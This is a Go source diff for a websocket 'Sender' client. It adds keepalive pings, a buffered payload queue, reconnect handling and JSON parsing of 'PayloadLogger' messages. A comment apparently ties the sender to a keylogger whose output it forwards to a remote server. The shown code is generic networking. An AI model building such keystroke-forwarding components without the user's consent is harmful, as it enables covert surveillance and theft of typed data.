@@ -1,6 +1,7 @@
 package internal
 
 import (
+	"encoding/json"
 	"fmt"
 	"log"
 	"log/slog"
@@ -8,6 +9,17 @@ import (
 	"time"
 
 	"github.com/gorilla/websocket"
+)
+
+const (
+	// Time allowed to write a message to the peer.
+	writeWait = 10 * time.Second
+	// Time allowed to read the next pong message from the peer.
+	pongWait = 10 * time.Second
+	// Send pings to peer with this period. Must be less than pongWait.
+	pingPeriod = (pongWait * 9) / 10
+	// Maximum message size allowed from peer.
+	maxMessageSize = 512
 )
 
 type Sender struct {
@@ -34,8 +46,11 @@ func MustGetNewSender(origin, apikey string) *Sender {
 		url_ws:          url_ws,
 		ws:              nil,
 		reader:          make(chan bool),
-		writer:          make(chan []byte),
-		done:            nil,
+		writer: make(
+			chan []byte,
+			100,
+		), // buffered channel to store payloads when there is no connection
+		done: nil,
 	}
 	go s.handleReconnects()
 	return s
@@ -47,7 +62,8 @@ func (s *Sender) connectWS() error {
 	}
 	ws, _, err := websocket.DefaultDialer.Dial(s.url_ws, nil)
 	if err != nil {
-		log.Fatal("dial:", err)
+		slog.Error("Could not dial server")
+		return err
 	}
 	s.ws = ws
 	s.done = make(chan struct{})
@@ -62,16 +78,19 @@ func (s *Sender) connectWS() error {
 }
 
 func (s *Sender) handleReconnects() {
-	if s.ws == nil {
+	// reconnect if ws is nil and there are payloads in the queue
+	if s.ws == nil && len(s.writer) > 0 {
 		// blocking call to start reading keylogger
+		slog.Info(fmt.Sprintf("Connecting ws with queue %d\n", len(s.writer)))
 		s.connectWS()
-		time.Sleep(1 * time.Second)
 	}
+	time.Sleep(3 * time.Second)
+	slog.Info("Reconnecting...")
 	s.handleReconnects()
 }
 
 func (s *Sender) write() {
-	ticker := time.NewTicker(time.Second)
+	ticker := time.NewTicker(pingPeriod)
 	defer ticker.Stop()
 
 	for {
@@ -97,27 +116,43 @@ func (s *Sender) write() {
 				)
 				return
 			}
+		case <-ticker.C:
+			s.ws.SetWriteDeadline(time.Now().Add(writeWait))
+			if err := s.ws.WriteMessage(websocket.PingMessage, nil); err != nil {
+				fmt.Printf("Disconnecting logger\n")
+				return
+			}
 		}
 	}
 }
 
 func (s *Sender) read() {
 	defer close(s.done)
+	s.ws.SetReadDeadline(time.Now().Add(pongWait))
+	s.ws.SetPongHandler(
+		func(string) error { s.ws.SetReadDeadline(time.Now().Add(pongWait)); return nil },
+	)
 	for {
-		var msg []byte
 		_, msg, err := s.ws.ReadMessage()
 		if err != nil {
 			if websocket.IsUnexpectedCloseError(
 				err,
-				websocket.CloseGoingAway,
+				websocket.CloseInternalServerErr,
 				websocket.CloseAbnormalClosure,
 			) {
 				slog.Error(fmt.Sprintf("Unexpected close error: %s\n", err.Error()))
 			}
-			slog.Error(fmt.Sprintf("sender:read: %s\n", err.Error()))
+			slog.Info(fmt.Sprintf("sender:read: %s\n", err.Error()))
 			return
 		}
 		slog.Info(fmt.Sprintf("received message: %s", msg))
+
+		var payload PayloadLogger
+		err = json.Unmarshal(msg, &payload)
+		if err != nil {
+			slog.Info("failed to parse payload")
+			continue
+		}
 	}
 }
 
